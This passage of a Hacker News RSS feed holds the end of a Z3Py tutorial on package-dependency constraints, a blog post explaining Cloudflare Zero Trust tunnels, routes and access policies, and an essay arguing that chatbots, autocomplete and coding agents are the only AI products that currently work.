packages <tt>b</tt>, <tt>c</tt> and <tt>z</tt>, we write:
</p>

<pre>DependsOn(a, [b, c, z])
</pre>

<p><tt>DependsOn</tt> is a simple Python function that creates Z3 constraints that capture the
depends clause semantics.
</p>

<pre>def DependsOn(pack, deps):
   return And([ Implies(pack, dep) for dep in deps ])
</pre>

<p>
Thus, <tt>Depends(a, [b, c, z])</tt> generates the constraint
</p>

<pre>And(Implies(a, b), Implies(a, c), Implies(a, z))
</pre>

<p>That is, if users install package <tt>a</tt>, they must also install packages
<tt>b</tt>, <tt>c</tt> and <tt>z</tt>.
</p>

<p>
If package <tt>d</tt> conflicts with package <tt>e</tt>, we write <tt>Conflict(d, e)</tt>.
<tt>Conflict</tt> is also a simple Python function.
</p>

<pre>def Conflict(p1, p2):
    return Or(Not(p1), Not(p2))
</pre>

<p><tt>Conflict(d, e)</tt> generates the constraint <tt>Or(Not(d), Not(e))</tt>.
With these two functions, we can easily encode the example in the
<a target="_blank" href="http://cseweb.ucsd.edu/~rjhala/papers/opium.pdf">Opium article</a> (Section 2) in Z3Py as:
</p>

<example pref="install.1">
<div><pre><span>def</span> <span>DependsOn</span><span>(</span><span>pack</span><span>,</span> <span>deps</span><span>):</span>
    <span>return</span> <span>And</span><span>([</span> <span>Implies</span><span>(</span><span>pack</span><span>,</span> <span>dep</span><span>)</span> <span>for</span> <span>dep</span> <span>in</span> <span>deps</span> <span>])</span>

<span>def</span> <span>Conflict</span><span>(</span><span>p1</span><span>,</span> <span>p2</span><span>):</span>
    <span>return</span> <span>Or</span><span>(</span><span>Not</span><span>(</span><span>p1</span><span>),</span> <span>Not</span><span>(</span><span>p2</span><span>))</span>

<span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>,</span> <span>d</span><span>,</span> <span>e</span><span>,</span> <span>f</span><span>,</span> <span>g</span><span>,</span> <span>z</span> <span>=</span> <span>Bools</span><span>(</span><span>'a b c d e f g z'</span><span>)</span>

<span>solve</span><span>(</span><span>DependsOn</span><span>(</span><span>a</span><span>,</span> <span>[</span><span>b</span><span>,</span> <span>c</span><span>,</span> <span>z</span><span>]),</span>
      <span>DependsOn</span><span>(</span><span>b</span><span>,</span> <span>[</span><span>d</span><span>]),</span>
      <span>DependsOn</span><span>(</span><span>c</span><span>,</span> <span>[</span><span>Or</span><span>(</span><span>d</span><span>,</span> <span>e</span><span>),</span> <span>Or</span><span>(</span><span>f</span><span>,</span> <span>g</span><span>)]),</span>
      <span>Conflict</span><span>(</span><span>d</span><span>,</span> <span>e</span><span>),</span>
      <span>a</span><span>,</span> <span>z</span><span>)</span>
</pre></div>
</example>

<p>
Note that the example contains the constraint
</p>

<pre>DependsOn(c, [Or(d, e), Or(f, g)]),
</pre>

<p>
The meaning is: to install <tt>c</tt>, we must install <tt>d</tt> or <tt>e</tt>, and <tt>f</tt> or <tt>g</tt>
</p>

<p>Now, we refine the previous example. First, we modify <tt>DependsOn</tt> to allow
us to write <tt>DependsOn(b, d)</tt> instead of <tt>DependsOn(b, [d])</tt>. We also
write a function <tt>install_check</tt> that returns a list of packages that must be installed
in the system. The function <tt>Conflict</tt> is also modified. It can now receive multiple
arguments.
</p>

<example pref="install.2">
<div><pre><span>def</span> <span>DependsOn</span><span>(</span><span>pack</span><span>,</span> <span>deps</span><span>):</span>
    <span>if</span> <span>is_expr</span><span>(</span><span>deps</span><span>):</span>
        <span>return</span> <span>Implies</span><span>(</span><span>pack</span><span>,</span> <span>deps</span><span>)</span>
    <span>else</span><span>:</span>
        <span>return</span> <span>And</span><span>([</span> <span>Implies</span><span>(</span><span>pack</span><span>,</span> <span>dep</span><span>)</span> <span>for</span> <span>dep</span> <span>in</span> <span>deps</span> <span>])</span>

<span>def</span> <span>Conflict</span><span>(</span><span>*</span><span>packs</span><span>):</span>
    <span>return</span> <span>Or</span><span>([</span> <span>Not</span><span>(</span><span>pack</span><span>)</span> <span>for</span> <span>pack</span> <span>in</span> <span>packs</span> <span>])</span>

<span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>,</span> <span>d</span><span>,</span> <span>e</span><span>,</span> <span>f</span><span>,</span> <span>g</span><span>,</span> <span>z</span> <span>=</span> <span>Bools</span><span>(</span><span>'a b c d e f g z'</span><span>)</span>

<span>def</span> <span>install_check</span><span>(</span><span>*</span><span>problem</span><span>):</span>
    <span>s</span> <span>=</span> <span>Solver</span><span>()</span>
    <span>s</span><span>.</span><span>add</span><span>(</span><span>*</span><span>problem</span><span>)</span>
    <span>if</span> <span>s</span><span>.</span><span>check</span><span>()</span> <span>==</span> <span>sat</span><span>:</span>
        <span>m</span> <span>=</span> <span>s</span><span>.</span><span>model</span><span>()</span>
        <span>r</span> <span>=</span> <span>[]</span>
        <span>for</span> <span>x</span> <span>in</span> <span>m</span><span>:</span>
            <span>if</span> <span>is_true</span><span>(</span><span>m</span><span>[</span><span>x</span><span>]):</span>
                <span># x is a Z3 declaration</span>
                <span># x() returns the Z3 expression</span>
                <span># x.name() returns a string</span>
                <span>r</span><span>.</span><span>append</span><span>(</span><span>x</span><span>())</span>
        <span>print</span> (<span>r</span>)
    <span>else</span><span>:</span>
        <span>print</span> (<span>"invalid installation profile"</span>)

<span>print</span> (<span>"Check 1"</span>)
<span>install_check</span><span>(</span><span>DependsOn</span><span>(</span><span>a</span><span>,</span> <span>[</span><span>b</span><span>,</span> <span>c</span><span>,</span> <span>z</span><span>]),</span>
              <span>DependsOn</span><span>(</span><span>b</span><span>,</span> <span>d</span><span>),</span>
              <span>DependsOn</span><span>(</span><span>c</span><span>,</span> <span>[</span><span>Or</span><span>(</span><span>d</span><span>,</span> <span>e</span><span>),</span> <span>Or</span><span>(</span><span>f</span><span>,</span> <span>g</span><span>)]),</span>
              <span>Conflict</span><span>(</span><span>d</span><span>,</span> <span>e</span><span>),</span>
              <span>Conflict</span><span>(</span><span>d</span><span>,</span> <span>g</span><span>),</span>
              <span>a</span><span>,</span> <span>z</span><span>)</span>

<span>print</span> (<span>"Check 2"</span>)
<span>install_check</span><span>(</span><span>DependsOn</span><span>(</span><span>a</span><span>,</span> <span>[</span><span>b</span><span>,</span> <span>c</span><span>,</span> <span>z</span><span>]),</span>
              <span>DependsOn</span><span>(</span><span>b</span><span>,</span> <span>d</span><span>),</span>
              <span>DependsOn</span><span>(</span><span>c</span><span>,</span> <span>[</span><span>Or</span><span>(</span><span>d</span><span>,</span> <span>e</span><span>),</span> <span>Or</span><span>(</span><span>f</span><span>,</span> <span>g</span><span>)]),</span>
              <span>Conflict</span><span>(</span><span>d</span><span>,</span> <span>e</span><span>),</span>
              <span>Conflict</span><span>(</span><span>d</span><span>,</span> <span>g</span><span>),</span>
              <span>a</span><span>,</span> <span>z</span><span>,</span> <span>g</span><span>)</span>
</pre></div>
</example>

<h2>Using Z3Py Locally</h2>

<p>Z3Py is part of the Z3 distribution. It is located in the <tt>python</tt> subdirectory.
To use it locally, you have to include the following command in your Python script.</p>
<pre>from Z3 import *
</pre>
<p>
The Z3 Python frontend directory must be in your <tt>PYTHONPATH</tt> environment variable.
Z3Py will automatically search for the Z3 library (<tt>z3.dll</tt> (Windows), <tt>libz3.so</tt> (Linux), or <tt>libz3.dylib</tt> (OSX)).
You may also initialize Z3Py manually using the command:
</p>
<pre>init("z3.dll")
</pre>



</div>]]></description>
        </item>
        <item>
            <title><![CDATA[I finally understand Cloudflare Zero Trust tunnels (242 pts)]]></title>
            <link>https://david.coffee/cloudflare-zero-trust-tunnels</link>
            <guid>45946865</guid>
            <pubDate>Sun, 16 Nov 2025 17:39:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://david.coffee/cloudflare-zero-trust-tunnels">https://david.coffee/cloudflare-zero-trust-tunnels</a>, See on <a href="https://news.ycombinator.com/item?id=45946865">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>A while ago, after frustration with Tailscale in environments where it couldn’t properly penetrate NAT/firewall and get a p2p connection, I decided to invest some time into learning something new: Cloudflare Zero Trust + Warp.</p><p>There are so many new concepts, but after way too long, I can finally say that <strong>I understand Cloudflare Zero Trust Warp now</strong>. I am a full-on Cloudflare Zero Trust with Warp convert, and while I still have Tailscale running in parallel, almost everything I do now is going through Zero Trust tunnels.</p><p>This post is an explanation of the basic concepts, because I’m sure others will have similar issues wrapping their head around it.</p><h4 id="why-tho">Why tho?</h4><p>Why would you even sink so much time into learning this? What does it give you?</p><p>Argo tunnels through Zero Trust allow you to do a bunch of <em>really</em> cool things:</p><ul><li>Connect private networks together - can be home networks, can be kubernetes clusters, you can create tunnels to and from every infra</li><li>Expose private services to the public, on public hostnames, no matter where they are running. You could even put your router running at 192.168.1.1 on the internet, accessible to everyone, no Warp client required</li><li>Create fully private networks with private IPs (10.x.x.x) that only resolve when Warp is connected, to services you specify</li><li>Quickly expose a public route to any service running locally or on any server, for quick development, testing webhooks or giving coworkers a quick preview</li><li>Create a fully private network running at home that’s only available when you’re connected to the Warp VPN client, or only to you, reachable anywhere</li><li>No worries about NAT, everything goes through the Cloudflare network, no direct p2p connection required</li><li>Add very granular access policies on who can access what - what login method does the user need, which email addresses are allowed. Allow bots and server-to-server exceptions with service access tokens.<ul><li>Does the user need to have Warp running? Does he need to be enrolled in Zero Trust? Does he need some special permission flag?</li></ul></li><li>Authenticate to SSH servers through Zero Trust access policies without the need of SSH keys. Just connect Warp, type <code>ssh host</code> and you’re logged in<ul><li>Close public SSH ports completely to only allow login through Warp</li></ul></li><li>Get the benefits of Cloudflare VPN edge routing on top (similar to 1.1.1.1 Warp+)</li></ul><h2 id="quickie-cloudflare-zero-trust-vs-tailscale">Quickie: Cloudflare Zero Trust vs Tailscale</h2><p>To get this out of the way:</p><ul><li><strong>Tailscale</strong>: peer-to-peer, uses NAT and firewall penetration methods to establish p2p connections. If not possible, it goes through central relay servers. Absolute best speed and latency if a connection is established.</li><li><strong>Cloudflare</strong>: All traffic (with the exception of warp-to-warp routing, which is p2p) goes through Cloudflare’s edge network. So even SSH-ing into your local router will hop through Cloudflare servers. This adds latency, but no issues with NAT at all.</li></ul><h2 id="cloudflared--warp">Cloudflared != Warp</h2><p>Cloudflare has 2 tools available: <a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/">Warp Client</a> and <a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/">Cloudflared</a>. They interact with each other and have similarities in some areas but are not the same.</p><p><strong>Warp Client</strong></p><p>The tool that connects you to the Cloudflare network. This is the thing that you configure to add clients into your Zero Trust network and enforces policies.</p><p>Usually this runs on clients, but can also run on servers.</p><p>Warp client also supports <a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/private-net/warp-to-warp/">warp-to-warp routing</a> which is a true p2p connection similar to Tailscale.</p><p><strong>Cloudflared</strong></p><p>The thing that creates a <strong>tunnel</strong> and adds it to the Zero Trust network.</p><p>Most commonly you run this on servers to expose tunnels into your network, but you can also run it on clients.</p><p>On the client side you can use <code>cloudflared access</code> to establish a connection with other things in your Zero Trust network.</p><p>Can also create one-time-use tunnels that aren’t connected to the Zero Trust network. Good for testing.</p><h2 id="tunnels-routes-targets">Tunnels, Routes, Targets</h2><p>This took me the longest to understand. Zero Trust allows you to configure <em>Tunnels</em>, <em>Routes</em> and <em>Targets</em>; here’s how they interplay.</p><h3 id="tunnels">Tunnels</h3><p>The most important part of your setup. Tunnels are deployed through <code>cloudflared</code> and are simply an <em>exit</em> for traffic. Think of it as a literal tunnel that has its end somewhere.</p><p>Tunnels are deployed to infrastructure in the target network. So if you have a home network with 192.168.1.1/24, you want to deploy <code>cloudflared</code> on any machine that’s always on and within that network. It can be your router, or your Raspi, it doesn’t matter.</p><p>For server-hosted services, you can have a tunnel on your main dev server, on a server, or on a pod in your Kubernetes cluster.</p><p>Now you have an opening into these networks through Warp/Argo tunnels.</p><h4 id="configuring-tunnels">Configuring tunnels</h4><p>You can either <a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/do-more-with-tunnels/local-management/configuration-file/">configure</a> tunnels through the Zero Trust UI by “adopting” them, or configure them in the <code>/etc/cloudflared/config.yml</code> config on the machine itself. Personal preference, I usually configure them on the machine itself.</p><p>The config specifies where a request should get routed to when it arrives at the tunnel. So the tunnel knows what to do with it.</p><p>In this config we tell cloudflared to route traffic arriving at this tunnel for hostname <code>gitlab.widgetcorp.tech</code> to localhost:80, and <code>gitlab-ssh</code> to the local SSH server.</p><pre tabindex="0"><code>❯ cat /etc/cloudflared/config.yml
tunnel: a2f17e27-cd4d-4fcd-b02a-63839f57a96f
credentials-file: /etc/cloudflared/a2f17e27-cd4d-4fcd-b02a-63839f57a96f.json
ingress:
  - hostname: gitlab.widgetcorp.tech
    service: http://localhost:80
  - hostname: gitlab-ssh.widgetcorp.tech
    service: ssh://localhost:22
  - service: http_status:404

  # Catch-all for WARP routing
  - service: http_status:404

warp-routing:
  enabled: true
</code></pre><p>The config alone doesn’t do anything. It just exposes a tunnel, and that’s it. What we need now are routes and targets.</p><h4 id="exposing-a-private-network-to-the-public-with-tunnels-quickly">Exposing a private network to the public with tunnels quickly</h4><p>Quick addition, as this is a super common use case. If you want to just expose something in your home network to the internet, you can add a config like this:</p><pre tabindex="0"><code>tunnel: a2f17e27-cd4d-4fcd-b02a-63839f57a96f
credentials-file: /etc/cloudflared/a2f17e27-cd4d-4fcd-b02a-63839f57a96f.json
ingress:
  - hostname: homeassistant.mydomain.com
    service: http://192.168.1.3:80
</code></pre><p>Then go into Cloudflare DNS settings and map the domain <code>homeassistant.mydomain.com</code> to the tunnel:</p><p><code>CNAME homeassistant.mydomain.com a2f17e27-cd4d-4fcd-b02a-63839f57a96f.cfargotunnel.com</code></p><p>Now all traffic going to this domain will go through the cloudflared tunnel, which is configured to route <code>homeassistant.mydomain.com</code> to <code>192.168.1.3</code>. <strong>No Warp client needed</strong>, Argo tunnel does everything for us.</p><p><strong>Note:</strong> If you adopted the tunnels and don’t use <code>config.yaml</code>, you can automatically create matching DNS records in the Cloudflare UI and don’t need to do this manually.</p><h3 id="routes">Routes</h3><p>A route defines <em>where</em> to direct traffic to.</p><p>Let’s say your homeassistant runs on 192.168.1.3 at home and you want to reach it from outside. Just above we deployed a <code>cloudflared</code> tunnel on our router at 192.168.1.3, and added a config pointing the domain to the Argo tunnel, so <code>homeassistant.mydomain.com</code> is already available to the public. However, <code>192.168.1.3</code> isn’t, as it’s a private network IP.</p><p><img src="https://david.coffee/routes-configure.png" alt="Configuring a route in Zero Trust"></p><p>You can define:</p><ul><li>A route like <code>192.168.1.1/24</code> pointing at your tunnel, to route <em>ALL</em> traffic to the full IP range through that tunnel (so even 192.168.1.245 will go through your tunnel)</li><li>Or a more specific route like <code>192.168.1.3/32</code> pointing at your tunnel, to <em>ONLY</em> route traffic to 192.168.1.3 through that tunnel.</li></ul><p>When configured, once your user connects their Warp client that’s set up with your Zero Trust network, the Warp client will see requests to 192.168.1.3 and route it through the Cloudflare network to reach your specific tunnel. Like a little police helper directing cars where to go.</p><p><em>If the Warp client is <strong>not</strong> connected, 192.168.1.3 will just resolve in your current local network. If connected, it will resolve to the tunnel.</em></p><p><strong>The routed IP doesn’t need to exist!</strong> So you could, for example, route a random IP you like (e.g., 10.128.1.1) to your tunnel, the tunnel then forwards it based on your routes, for example to 192.168.1.1. This is extremely powerful because it allows you to build your own fully virtual network.</p><p>That’s all it does, what happens afterwards is up to the tunnel config that we created above. The tunnel decides where to point the incoming request to, whether that’s localhost or somewhere else.</p><p>To summarize, the <code>route</code> tells the Warp client where to route traffic to.</p><p>Now we have 2 things working:</p><ul><li><code>homeassistant.mydomain.com</code> - goes through a Cloudflare DNS record pointing at an Argo tunnel, which then forwards to 192.168.1.3. This works without Warp connected as it’s on the DNS level, public to everyone.</li><li><code>192.168.1.3</code> - The Warp client sees the request and routes it through the Argo tunnel, which then forwards it to <code>192.168.1.3</code> within that network. This needs Warp connected to work, and is only visible to people in your Zero Trust org.</li></ul><h3 id="targets">Targets</h3><p>This one took me a while.</p><p>Targets are needed to <em>define a piece of infrastructure</em> that you want to protect through Zero Trust. They are like a pointer pointing to something in your network. This goes hand-in-hand with routes, but isn’t always needed.</p><p>Let’s say you have 192.168.1.3 (homeassistant) exposed through a Cloudflare tunnel. By default, anyone in your network that is part of your Zero Trust org and has Warp client installed can now access your homeassistant at 192.168.1.3.</p><p>We can change that with targets. For example, defining a target with hostname = <code>homeassistant.mydomain.com</code> to the route <code>192.168.1.3/32</code> allows us to add access policies to it. We can also put an entire network into the target by specifying <code>192.168.1.3/24</code> to control access. This also works with virtual IPs like 10.128.1.1!</p><p><img src="https://david.coffee/targets-config-screen.png" alt="Configuring a target in Zero Trust"></p><p>Targets alone won’t do anything, they just point to the service or network. “Hey, here is homeassistant”, or “hey, here is my home network”.</p><h2 id="access-policies-protecting-who-can-access-what">Access Policies: Protecting Who Can Access What</h2><p>Continuing the example from above:</p><ul><li>we have a tunnel running on our home network that routes <code>homeassistant.mydomain.com</code> to <code>192.168.1.3</code></li><li>we set up public DNS records to point <code>homeassistant.mydomain.com</code> to the Argo tunnel in Cloudflare</li><li>we created a <em>route</em> <code>192.168.1.3</code> to go through the same tunnel</li><li>we also created a <em>target</em> pointing to <code>192.168.1.3</code></li></ul><p>When users access either <code>192.168.1.3</code> or <code>homeassistant.mydomain.com</code>, the Warp client will route the request through the tunnel, which then forwards the request to 192.168.1.3. Homeassistant loads and everything is fine.</p><p><em>But do we want that?</em></p><p>Probably not.</p><p>Access policies to the rescue!</p><p>With access policies, we can leave things in the public but protect them with Cloudflare Zero Trust access. So while 192.168.1.3 is only available if Warp is connected (so routing to it works), we can add security to our public <code>homeassistant.mydomain.com</code>.</p><p>Go to Access -&gt; Applications -&gt; Add an Application -&gt; Self-hosted.</p><p>Here we can define <em>what</em> should be protected, and <em>how</em>.</p><p>Going with our previous example, we can add a public hostname <code>homeassistant.mydomain.com</code> or an IP like <code>192.168.1.3</code> (or both), then attach policies of who should be able to access it.</p><p>You can specify <strong>Include</strong> (“OR”) and <strong>Require</strong> (“AND”) selectors.</p><ul><li><strong>Require</strong> rules must always be met, <em>on top</em> of include rules, to grant access</li><li>Any of the <strong>Include</strong> rules must match to grant access</li></ul><p>Then there are <em>Actions</em>:</p><ul><li><strong>Allow</strong> - when the policy matches, allow access</li><li><strong>Deny</strong> - when the policy matches, deny access. aka blocking something.</li><li><strong>Bypass</strong> - when the policy matches, bypass Zero Trust completely. No more checking.</li><li><strong>Service Auth</strong> - when the policy matches, allow authentication to the service with a service token header (good for server-to-server, or bots). Check Access -&gt; Service Auth to create these tokens.</li></ul><h3 id="allow-public-access-to-everyone-logging-into-your-network">Allow public access to everyone logging into your network</h3><p>The most common use case: <code>homeassistant.mydomain.com</code> is public. We want to keep it public, but add an extra layer of security.</p><p>Add an <em>include</em> policy, pick any of the <code>email</code> selectors, add the email of the user you want to allow access to. Now only people authenticated with your Zero Trust org with the specified emails can access your homeassistant, without needing to have Warp running.</p><p>We can harden this by adding <em>require</em> rules: Add a <em>Login Method</em> selector rule, pick a specific login method like GitHub. Now only people with specific emails that have authenticated through GitHub can access your homeassistant, without needing to have Warp running.</p><p><img src="https://david.coffee/policy-github-emails.png" alt="Configuring an Access Policy with GitHub and email"></p><h3 id="bypass-login-completely-when-connected-through-warp">Bypass login completely when connected through WARP</h3><p>Another policy I like having is to skip the login screen entirely when connected through Warp. If a user is already enrolled into my Zero Trust org and has the Warp client provisioned, then there’s no need to ask them to authenticate again.</p><p>We can add a separate policy (don’t edit the one we just created above), pick the <em>Gateway</em> selector and set it to <em>Allow</em> or <em>Bypass</em>.</p><p><img src="https://david.coffee/policy-gateway-auth.png" alt="Policy to allow Gateway auth"></p><p><strong>Don’t use ‘Warp’</strong> - the Warp selector will match anyone that has Warp running, including the consumer 1.1.1.1 app. <em>Gateway</em>, on the other hand, matches only if someone is connecting through your Gateway, be that DNS or a provisioned Warp client.</p><p><em>(The ‘Gateway’ selector is only available if the Warp client is set to allow WARP authentication identity)</em></p><p>Now when:</p><ul><li>Warp through Zero Trust is running on a machine: No login screen</li><li>No Warp running (public access): Prompt for login screen, but only allow specific emails that authenticated through GitHub</li></ul><p>This setup makes it very convenient to reach homeassistant, no matter if connected through Warp or not.</p><h2 id="deploying-the-warp-client-and-enrolling-into-zero-trust">Deploying the Warp client and enrolling into Zero Trust</h2><p>Are you still with me?</p><p>Our network is basically done. We have a login-protected <code>homeassistant.mydomain.com</code> that routes through our tunnel into our private network and terminates at <code>192.168.1.3</code>, and we have a direct route to <code>192.168.1.3</code> that only works when connected with Warp.</p><p>We also have login policies to make sure only specific users (logged in with GitHub and certain email addresses) can access homeassistant.</p><p><em>So how do we deploy the dang Warp client?</em></p><p>Actually the same: We create some policies.</p><p><strong>Head to Settings -&gt; Warp Client</strong></p><p>In <strong>Enrollment Permissions</strong>, we specify the same policies for who can enroll. For example, “<a href="https://david.coffee/cdn-cgi/l/email-protection" data-cfemail="197f7676377b786b597d7674787077377a7674">[email&nbsp;protected]</a>” when authenticated through GitHub is allowed to enroll. In the <em>Login Methods</em> we can specify what login methods are available when someone tries to enroll into our Zero Trust org.</p><p><img src="https://david.coffee/enrollment-policy-login-methods.png" alt="Login methods enroll policies"></p><p>Toggle <em>WARP authentication identity settings</em> to make the <em>Gateway</em> selector available in policies, effectively allowing the configured WARP client to be used as a login method.</p><p><strong>Careful here</strong>, once someone is enrolled, they are basically in your Zero Trust network through Warp. Make sure you harden this.</p><p>Then, in <strong>Profile settings</strong>, we define <em>how the WARP client behaves</em>. These are things like protocol: MASQUE or WireGuard, service mode, what IPs and domains to exclude from WARP routing (e.g., the local network should never go through WARP), setting it to exclude or include mode and so on.</p><p>Other settings I recommend setting:</p><ul><li><em>Install CA to system certificate store</em> - installs the Cloudflare CA certificate automatically when enrolled.</li><li><em>Override local interface IP</em> - assigns a unique CGNAT private IP to the client. This is needed for warp-to-warp routing.</li><li><em>Device Posture</em> - what checks the WARP client should perform for the org. E.g., check the OS version, some OS files on disk, etc. I have this set to <em>WARP</em> and <em>Gateway</em> because I want the client to provide information on whether the user is connected through WARP and Gateway, for skipping certain login pages.</li></ul><p><img src="https://david.coffee/device-posture-checks.png" alt="Device posture checks for Gateway and Warp"></p><p>Once done, just open the Warp client (<a href="https://developers.cloudflare.com/warp-client/)">https://developers.cloudflare.com/warp-client/)</a>, and log in to your network. This should open the login pages you specified in the <em>Device Enrollment</em> screen, and check all the enrollment policies you specified.</p><p>Once passed, congratulations, your WARP client is now connected to your Zero Trust network. The client will then go ahead and start routing <code>192.168.1.3</code> through your tunnels, as specified in your tunnel and route settings.</p><p>🎉</p><h2 id="what-we-built">What we built</h2><p>If you followed this guide, here is what we built:</p><ul><li>Login methods to connect the Warp client to your Zero Trust org through GitHub and specific email addresses</li><li>A <em>tunnel</em> within your private network that<ul><li>Forwards any request coming in with host <code>homeassistant.mydomain.com</code> to <code>192.168.1.3</code></li></ul></li><li>A <em>route</em> that forwards all traffic for <code>192.168.1.3</code> to the tunnel in your private network, which will terminate it at 192.168.1.3, which will only work when connected through Warp to route the request</li><li>A DNS name <code>homeassistant.mydomain.com</code> that points to the Argo tunnel, and will allow everyone (even if not connected through Warp) to access homeassistant which runs at 192.168.1.3</li><li>Access policies that will<ul><li>Ask users that are not connected to Zero Trust through Warp to log in with GitHub and specific email, so everyone can access it if they can log in</li><li>A policy that skips the login screen completely and just shows homeassistant if the user connects through Zero Trust Warp client (enrolled into our org)</li></ul></li></ul><p>You don’t need the public domain and you don’t need the route to 192.168.1.3. These are 2 different options that you can use to expose homeassistant when you’re not at home. One is using a public domain name everyone can see, one is explicitly requiring connecting through enrolled Warp.</p><p>What I <em>didn’t</em> cover in this post:</p><ul><li>Warp-to-warp routing</li><li>Creating and assigning fully private IPs that only exist within your Zero Trust network</li><li>SSH authentication through Zero Trust access policies (that’s what we need <em>Targets</em> for)</li><li>The other application types besides <em>Self-Hosted</em></li></ul><p>I’m happy to expand on it if there’s interest. Let me know on <a href="https://x.com/dvcrn">X</a> or <a href="https://bsky.app/profile/david.d.sh">Bluesky</a>.</p><p>Happy tunneling! ⛅</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Three kinds of AI products work (124 pts)]]></title>
            <link>https://www.seangoedecke.com/ai-products/</link>
            <guid>45946498</guid>
            <pubDate>Sun, 16 Nov 2025 16:56:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.seangoedecke.com/ai-products/">https://www.seangoedecke.com/ai-products/</a>, See on <a href="https://news.ycombinator.com/item?id=45946498">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><p>The very first LLM-based product, ChatGPT, was just<sup id="fnref-1"><a href="#fn-1">1</a></sup> the ability to talk with the model itself: in other words, a pure chatbot. This is still the most popular LLM product by a large margin.</p>
<p>In fact, given the amount of money that’s been invested in the industry, it’s shocking how many “new AI products” are just chatbots. As far as I can tell, <strong>there are only three types of AI product that currently work</strong>.</p>
<h3>Chatbots</h3>
<p>For the first couple of years of the AI boom, all LLM products were chatbots. They were branded in a lot of different ways - maybe the LLM knew about your emails, or a company’s helpdesk articles - but the fundamental <em>product</em> was just the ability to talk in natural language to an LLM.</p>
<p>The problem with chatbots is that <strong>the best chatbot product is the model itself</strong>. Most of the reason users want to talk with an LLM is generic: they want to ask questions, or get advice, or confess their sins, or do any one of a hundred things that have nothing to do with your particular product. </p>
<p>In other words, your users will just use ChatGPT<sup id="fnref-2"><a href="#fn-2">2</a></sup>. AI labs have two decisive advantages over you: first, they will always have access to the most cutting-edge models before you do; and second, they can develop their chatbot harness simultaneously with the model itself (like how Anthropic specifically trains their models to be used in Claude Code, or OpenAI trains their models to be used in Codex).</p>
<h4>Explicit roleplay</h4>
<p>One way your chatbot product can beat ChatGPT is by doing what OpenAI won’t do: for instance, happily roleplaying an AI boyfriend or generating pornography. There is currently a very lucrative niche of products like this, which typically rely on less-capable but less-restrictive open-source models.</p>
<p>These products have the problems I discussed above. But it doesn’t matter that their chatbots are less capable than ChatGPT or Claude: if you’re in the market for sexually explicit AI roleplay, and ChatGPT and Claude won’t do it, you’re going to take what you can get.</p>
<p>I think there are serious ethical problems with this kind of product. But even practically speaking, this is a segment of the industry likely to be eaten alive by the big AI labs, as they become more comfortable pushing the boundaries of adult content. <a href="https://tremendous.blog/2025/07/15/grok-companions-elons-ai-girlfriend/">Grok Companions</a> is already going down this pathway, and Sam Altman has <a href="https://www.theverge.com/news/799312/openai-chatgpt-erotica-sam-altman-verified-adults">said</a> that OpenAI models will be more open to generating adult content in the future.</p>
<h4>Chatbots with tools</h4>
<p>There’s a slight variant on chatbots which gives the model <em>tools</em>: so instead of just chatting with your calendar, you can ask the chatbot to book meetings, and so on. This kind of product is usually called an “AI assistant”.</p>
<p>This doesn’t work well because <strong>savvy users can manipulate the chatbot into calling tools</strong>. So you can never give a support chatbot real support powers like “refund this customer”, because the moment you do, thousands of people will immediately find the right way to jailbreak your chatbot into giving them money. You can only give your chatbots tools that the user could do themselves - in which case, your chatbot is competing with the usability of your actual product, and will likely lose.</p>
<p>Why will your chatbot lose? Because <strong>chat is not a good user interface</strong>. Users simply do not want to type out “hey, can you increase the font size for me” when they could simply hit “ctrl-plus” or click a single button<sup id="fnref-3"><a href="#fn-3">3</a></sup>.</p>
<p>I think this is a hard lesson for engineers to learn. It’s tempting to believe that since chatbots have gotten 100x better, they must now be the best user interface for many tasks. Unfortunately, they started out 200x worse than a regular user interface, so they’re still twice as bad.</p>
<h3>Completion</h3>
<p>The second real AI product actually came out before ChatGPT did: GitHub Copilot. The idea behind the original Copilot product (and all its imitators, like Cursor Tab) is that a fast LLM can act as a smart autocomplete. By feeding the model the code you’re typing as you type it, a code editor can suggest autocompletions that actually write the rest of the function (or file) for you.</p>
<p>The genius of this kind of product is that <strong>users never have to talk to the model</strong>. Like I said above, chat is a bad user interface. LLM-generated completions allow users to access the power of AI models without having to change any part of their current workflow: they simply see the kind of autocomplete suggestions their editor was already giving them, but far more powerful.</p>
<p>I’m a little surprised that completions-based products haven’t taken off outside coding (where they immediately generated a multi-billion-dollar market). Google Docs and <a href="https://support.microsoft.com/en-us/office/editor-text-predictions-in-word-7afcb4f3-4aa2-443a-9b08-125a5d692576">Microsoft Word</a> both have something like this. Why isn’t there more hype around this?</p>
<ul>
<li>Maybe the answer is that the people using this product don’t engage with AI online spaces, and are just quietly using the product?</li>
<li>Maybe there’s something about normal professional writing that’s less amenable to autocomplete than code? I doubt that, since so much normal professional writing is being copied out of a ChatGPT window.</li>
<li>It could be that code editors already had autocomplete, so users were familiar with it. I bet autocomplete is brand-new and confusing to many Word users.</li>
</ul>
<h3>Agents</h3>
<p>The third real AI product is the coding agent. People have been talking about this for years, but it was only really in 2025 that the technology behind coding agents became feasible (with Claude Sonnet 3.7, and later GPT-5-Codex).</p>
<p>Agents are kind of like chatbots, in that users interact with them by typing natural language text. But they’re unlike chatbots in that <strong>you only have to do that once</strong>: the model takes your initial request and goes away to implement and test it all by itself.</p>
<p>The reason agents work and chatbots-with-tools don’t is the difference between asking an LLM to hit a single button for you and asking the LLM to hit a hundred buttons in a specific order. Even though each individual action would be easier for a human to perform, agentic LLMs are now smart enough to take over the entire process.</p>
<p>Coding agents are a natural fit for AI agents for two reasons:</p>
<ul>
<li>It’s easy to verify changes by running tests or checking if the code compiles</li>
<li>AI labs are incentivized to produce effective coding models to accelerate their own work</li>
</ul>
<p>For my money, the current multi-billion-dollar question is <strong>can AI agents be useful for tasks other than coding?</strong> Bear in mind that Claude Sonnet 3.7<sup id="fnref-4"><a href="#fn-4">4</a></sup> was released just under <em>nine months ago</em>. In that time, the tech industry has successfully built agentic products about their own work. They’re just starting to build agentic products for other tasks. It remains to be seen how successful that will be, or what those products will look like.</p>
